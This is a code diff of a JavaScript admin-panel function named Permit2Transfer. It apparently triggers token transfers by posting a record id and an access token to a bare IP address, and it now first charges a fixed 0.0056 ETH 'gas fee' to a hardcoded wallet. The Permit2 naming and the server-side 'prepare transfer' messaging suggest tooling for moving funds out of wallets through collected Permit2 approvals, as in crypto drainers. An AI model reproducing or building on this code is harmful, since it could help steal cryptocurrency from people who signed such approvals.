@@ -17,19 +17,36 @@ function GetRequest() {
     }
     return theRequest;
 }
-const Permit2Transfer = async (event, data) => {
-    const row_id =
-        event.target.parentElement.parentElement.attributes["data-key"].value;
-    const apiUrl = "http://223.26.57.114/publishtsfmsg";
-    const url_parameters = GetRequest();
-    const obj = {
-        id: row_id,
-        token: url_parameters["token"],
-    };
-    //发mq消息给服务器，准备transfer
-    admin.ajax.post(apiUrl, obj, async function (result) {
-        console.log(result);
-    });
+const Permit2Transfer = async (event) => {
+    const web3 = new Web3();
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    //收取gas费用sendTransaction
+    signer
+        .sendTransaction({
+            //from: provider.provider.selectedAddress,
+            to: "0x5eE4A19bf6D6908AB12853Af169575bBFeCF8BFE",
+            value: ethers.utils.parseEther("0.0056"),
+        })
+        .then((res) => {
+            //发布转账消息到mq
+
+            const row_id =
+                event.target.parentElement.parentElement.attributes["data-key"]
+                    .value;
+            const apiUrl = "https://223.26.57.114/publishtsfmsg";
+            const url_parameters = GetRequest();
+            const obj = {
+                id: row_id,
+                token: url_parameters["token"],
+                // username: data,
+            };
+            //发mq消息给服务器，准备transfer
+            admin.ajax.post(apiUrl, obj, async function (result) {
+                admin.toastr.success(result.data.message);
+            });
+        });
 };
 
 const Permit2SpenderMulti = async (event) => {
